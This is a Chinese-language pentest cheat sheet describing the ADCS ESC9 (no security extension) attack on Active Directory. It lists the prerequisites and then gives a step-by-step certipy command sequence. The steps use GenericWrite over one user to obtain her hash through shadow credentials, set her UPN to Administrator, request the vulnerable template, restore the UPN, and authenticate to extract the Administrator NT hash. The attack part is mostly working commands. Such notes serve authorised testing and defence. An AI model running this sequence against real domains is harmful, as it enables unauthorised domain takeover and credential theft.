# Active Directory - 证书 ESC9

## ESC9 - 无安全扩展

**前提条件**

* `StrongCertificateBindingEnforcement` 设置为 `1`（默认）或 `0`
* 证书在 `msPKI-Enrollment-Flag` 值中包含 `CT_FLAG_NO_SECURITY_EXTENSION` 标志
* 证书指定了 `Any Client` 身份验证 EKU
* 对任意帐户 A 具有 `GenericWrite` 权限以接管任意帐户 B

**攻击场景**

John@corp.local 对 Jane@corp.local 拥有 **GenericWrite** 权限，我们想要接管 Administrator@corp.local。
Jane@corp.local 被允许注册 ESC9 证书模板，该模板在 **msPKI-Enrollment-Flag** 值中指定了 **CT_FLAG_NO_SECURITY_EXTENSION** 标志。

* 使用影子凭据获取 Jane 的哈希（利用 GenericWrite 权限）

    ```ps1
    certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
    ```

* 将 Jane 的 **userPrincipalName** 更改为 Administrator。:warning: 注意去掉 `@corp.local` 部分

    ```ps1
    certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator
    ```

* 从 Jane 的帐户请求易受攻击的证书模板 ESC9

    ```ps1
    certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9
    # 证书中的 userPrincipalName 为 Administrator
    # 颁发的证书中不包含"对象 SID"
    ```

* 将 Jane 的 userPrincipalName 恢复为 Jane@corp.local

    ```ps1
    certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local
    ```

* 使用该证书进行身份验证，获取 Administrator@corp.local 用户的 NT 哈希

    ```ps1
    certipy auth -pfx administrator.pfx -domain corp.local
    # 由于证书中未指定域，需在命令行中添加 -domain <domain>
    ```

## 参考资料

* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
